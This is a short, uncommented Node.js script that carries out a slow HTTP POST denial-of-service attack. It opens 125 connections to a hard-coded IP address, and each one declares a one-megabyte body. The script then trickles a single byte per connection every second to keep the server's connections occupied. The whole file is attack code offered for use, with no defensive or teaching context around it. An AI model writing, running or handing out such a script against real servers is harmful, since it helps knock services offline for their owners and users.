var http = require('https');
var url = '1.1.1.1';
var max_connections = 125, 
    length = 1000000;
var params = {
    'host': url,
    'Content-Length': length
}
var connections = [];
for(var i=0; i<max_connections; i++){

    var obj = {}
        obj.cnx = http.createClient(80, url);
        obj.req = obj.cnx.request('post','/t13r/', params);
    connections.push(obj);
}
var next = function(cnt){
    for(var i=0; i<max_connections; i++){
        //request.write('a');
        connections[i].req.write('a');
    }
    console.log(cnt);
    cnt++;
    var x = setTimeout(function(){
        next(cnt);
    }, 1000);
    if( cnt > length ){
        clearInterval(x);

        for(var i=0; i<max_connections; i++){
            connections[i].req.end();
        }
    }
}
next(1);
